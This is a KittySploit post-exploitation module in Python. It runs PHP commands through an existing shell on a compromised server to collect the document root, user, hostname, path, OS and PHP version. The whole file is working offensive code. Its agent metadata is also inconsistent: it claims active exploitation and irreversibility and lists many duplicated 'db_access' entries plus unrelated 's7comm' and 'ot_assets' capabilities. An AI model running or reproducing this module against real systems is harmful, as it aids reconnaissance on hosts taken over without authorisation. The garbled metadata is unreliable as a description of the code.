from kittysploit import *

class Module(Post):

	__info__ = {
		"name": "Collect system information",
		"description": "Collect system information",
		"arch": Arch.PHP,
	'agent': {
	    'risk': 'intrusive',
	    'effects': ['active_exploitation'],
	    'expected_requests': 2,
	    'reversible': False,
	    'approval_required': True,
	    'produces': ['risk_signals'],
	    'cost': 1.5,
	    'noise': 0.5,
	    'value': 1.0,
	    'requires': 	    {'min_endpoints': 0,
	     'min_params': 0,
	     'tech_hints_any': [],
	     'tech_hints_all': [],
	     'specializations_any': [],
	     'risk_signals_any': [],
	     'auth_session': False,
	     'capabilities_any': [],
	     'capabilities_all': [],
	     'confidence_min': {},
	     'confidence_min_any': {},
	     'endpoint_pattern_any': [],
	     'param_any': [],
	     'api_surface_ready': False},
	    'chain': 	    {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 's7comm', 'from_detail': ''},
	                               {'capability': 'ot_assets', 'from_detail': ''},
	                               {'capability': 'ot_assets', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''},
	                               {'capability': 'db_access', 'from_detail': ''}],
	     'consumes_capabilities': ['shell'],
	     'option_bindings': {},
	     'suggested_followups': []},
	},
	}	
		
	def run(self):
		output = self.cmd_execute("print(@$_SERVER['DOCUMENT_ROOT']);")
		print_info(f"Document root : {output.strip() if output else 'N/A'}")
		
		output = self.cmd_execute("""
if(is_callable('posix_getpwuid')&&is_callable('posix_geteuid')) {
	$u=@posix_getpwuid(@posix_geteuid());
	if($u){
		$u=$u['name'];
	} else {
		$u=getenv('username');
	}
	print($u);
}
""")
		print_info(f"User : {output.strip() if output else 'N/A'}")
		
		output = self.cmd_execute("print(@gethostname());")
		print_info(f"Hostname : {output.strip() if output else 'N/A'}")
		
		output = self.cmd_execute("@print(getcwd());")
		print_info(f"Path : {output.strip() if output else 'N/A'}")
		
		output = self.cmd_execute("print(@php_uname());")
		print_info(f"Uname : {output.strip() if output else 'N/A'}")
		
		output = self.cmd_execute("print(@php_uname('s'));")
		print_info(f"Os : {output.strip() if output else 'N/A'}")
		
		output = self.cmd_execute('print(@ini_get("max_execution_time"));')
		print_info(f"Max_execution_time : {output.strip() if output else 'N/A'}")
		
		output = self.cmd_execute("""
$v='';
if(function_exists('phpversion')) {
	$v=phpversion();
} elseif(defined('PHP_VERSION')) {
	$v=PHP_VERSION;
} elseif(defined('PHP_VERSION_ID')) {
	$v=PHP_VERSION_ID;
}
print($v);
""")
		print_info(f"Php version : {output.strip() if output else 'N/A'}")
		return True